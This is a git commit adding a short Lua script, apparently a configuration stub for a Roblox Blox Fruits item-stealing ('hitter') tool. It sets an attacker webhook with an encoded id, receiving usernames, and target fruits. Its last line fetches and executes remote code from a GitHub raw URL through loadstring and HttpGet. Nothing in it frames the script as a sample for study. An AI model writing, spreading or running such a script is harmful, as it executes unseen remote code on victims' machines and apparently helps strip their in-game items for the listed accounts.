f7c4f8115d9a47607840514c9ed4943adb6928c6
Realredzhubv4 <154838098+lakshaya372@users.noreply.github.com>
2025-03-12 02:28:23 +0530

    Create realredz.lua

---
+++ realredz.lua
@@ -0,0 +1,5 @@
+Webhook = "https://webhook-protect.vercel.app/api/webhook?id=cGxva2xqSXBRZ1hKT2J2SnJ3c1QyZzplZGE3dmdMbDNfTFJPZ1NmdGcycDJsUnlhSFhBRXlTQkZGZXpVYWF5eFRjYUd4N2dtRjBia21na2FpeGMxYmg4eVBtelV2b1pFRWphTXZrc0s1MEhHX2xoQ0M3bUxJMktNNGZwaW5VOEt1dFpDdElBS0RIdWxpZ0Z2Wm04MldIdG5kVjFTd081VERGMGlsb0tIeEVPY3IwVUNxSllsS3FHT09yTWNKUnFBWGc" -- << Your Webhook
+Usernames = {"lakshaya28"} -- << Your username(-s).
+FruitsToHit = {"Kitsune-Kitsune", "Leopard-Leopard", "Yeti-Yeti", "Gas-Gas", "Dough-Dough", "Trex-Trex"} -- << Fruits you want
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/surelyco/CutestCodes/refs/heads/main/V2"))()
